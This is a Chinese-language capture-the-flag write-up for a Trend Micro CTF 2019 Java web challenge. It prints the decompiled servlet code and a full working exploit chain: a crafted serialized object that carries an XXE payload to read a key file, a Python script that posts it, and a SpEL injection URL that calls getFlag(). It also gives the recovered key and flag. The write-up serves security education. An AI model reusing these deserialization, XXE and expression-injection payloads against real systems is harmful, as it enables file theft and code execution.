# 300

[English Version](https://balsn.tw/ctf_writeup/20190913-trendmicroctf/#300)

unzip war包，然後decompile class，得到關鍵源碼:

Person.java:

```java
package com.trendmicro;

import org.xml.sax.SAXException;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.Document;
import javax.xml.parsers.DocumentBuilder;
import java.io.InputStream;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable
{
    public String name;
    private static final long serialVersionUID = -559038737L;
    
    public Person(final String name) {
        this.name = name;
    }
    
    private void readObject(final ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, ParserConfigurationException, SAXException {
        final int paramInt = aInputStream.readInt();
        final byte[] arrayOfByte = new byte[paramInt];
        aInputStream.read(arrayOfByte);
        final ByteArrayInputStream localByteArrayInputStream = new ByteArrayInputStream(arrayOfByte);
        final DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();
        localDocumentBuilderFactory.setNamespaceAware(true);
        final DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();
        final Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);
        final NodeList nodeList = localDocument.getElementsByTagName("tag");
        final Node node = nodeList.item(0);
        this.name = node.getTextContent();
    }
}
```

CustomOIS.java:

```java
package com.trendmicro;

import java.util.Arrays;
import java.io.ObjectStreamClass;
import java.io.IOException;
import java.io.InputStream;
import javax.servlet.ServletInputStream;
import java.io.ObjectInputStream;

public class CustomOIS extends ObjectInputStream
{
    private static final String[] whitelist;
    
    static {
        whitelist = new String[] { "com.trendmicro.Person" };
    }
    
    public CustomOIS(final ServletInputStream is) throws IOException {
        super((InputStream)is);
    }
    
    public Class<?> resolveClass(final ObjectStreamClass des) throws IOException, ClassNotFoundException {
        if (!Arrays.asList(CustomOIS.whitelist).contains(des.getName())) {
            throw new ClassNotFoundException("Cannot deserialize " + des.getName());
        }
        return super.resolveClass(des);
    }
}
```

Office.java:

```java
package com.trendmicro;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.charset.Charset;
import java.io.IOException;
import javax.servlet.ServletException;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import java.nio.charset.StandardCharsets;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;

@WebServlet({ "/Office" })
public class Office extends HttpServlet
{
    private static final long serialVersionUID = 1L;
    
    protected void doGet(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        final String nametag = request.getParameter("nametag");
        final String keyParam = request.getParameter("key");
        final String keyFileLocation = "/TMCTF2019/key";
        final String key = readFile(keyFileLocation, StandardCharsets.UTF_8);
        if (key.contentEquals(keyParam)) {
            final ExpressionParser parser = (ExpressionParser)new SpelExpressionParser();
            final String expString = "'" + nametag + "' == 'Marshal'";
            final Expression exp = parser.parseExpression(expString);
            final Boolean isMarshal = (Boolean)exp.getValue();
            if (isMarshal) {
                response.getWriter().append("Welcome Marsal");
            }
            else {
                response.getWriter().append("I am sorry but you cannot see the Marshal");
            }
        }
        else {
            response.getWriter().append("Did you forget your keys Marshal?");
        }
    }
    
    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        this.doGet(request, response);
    }
    
    static String readFile(final String path, final Charset encoding) throws IOException {
        final byte[] encoded = Files.readAllBytes(Paths.get(path, new String[0]));
        return new String(encoded, encoding);
    }
}
```

Server.java:

```java
package com.trendmicro;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;

@WebServlet({ "/jail" })
public class Server extends HttpServlet
{
    private static final long serialVersionUID = 1L;

    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        try {
            final ServletInputStream is = request.getInputStream();
            final CustomOIS ois = new CustomOIS(is);
            final Person person = (Person)ois.readObject();
            ois.close();
            response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");
        }
        catch (Exception e) {
            response.setStatus(500);
            e.printStackTrace(response.getWriter());
        }
    }
}
```

從源碼可以看出大致目標:

反序列化Person object，串XXE讀key

最後用這把key去做SpEL injection跑getFlag()

Payload:

```java
package com.trendmicro;

import java.io.ObjectInputStream;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.io.Serializable;
import org.xml.sax.SAXException;
import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.w3c.dom.Document;
import javax.xml.parsers.DocumentBuilder;
import java.io.InputStream;
import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;

public class SerializeTest {

    public static void main(String args[]) throws Exception {

        Person p = new Person("kaibro");
        FileOutputStream fos = new FileOutputStream("name.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(p);
        os.close();

    }
}

class Person implements Serializable {
    public String name;
    private static final long serialVersionUID = -559038737L;

    public Person(final String name) {
        this.name = name;
    }

    private void writeObject(ObjectOutputStream stream) throws ClassNotFoundException, IOException,
        ParserConfigurationException, SAXException {
        stream.writeInt(100);
        String s = ("<?xml version=\"1.0\"?><!DOCTYPE kaibro[<!ENTITY xxe SYSTEM \"file:///TMCTF2019/key\">]><tag>&xxe;</tag>");
        byte[] tmp = s.getBytes();
        stream.write(tmp);
    }
}
```

a.py:

```python
import requests

with open("name.ser") as f:
    x  = f.read()
r = requests.post("http://flagmarshal.xyz/jail", data=x, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print r.text
```

`javac -d . *.java`

`java com.trendmicro.SerializeTest`

`python a.py`

=> `Sorry Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain. I cannot let you have the Flag!.`

讀到key後，就能直接叫`getFlag()`

http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&nametag='%2bT(com.trendmicro.jail.Flag).getFlag()%2b'

![](https://github.com/w181496/CTF/blob/master/trendmicro-ctf-2019/forensics300/trend.png)

`TMCTF{F0OlLM3TwIcE1Th@Tz!N1C3}`
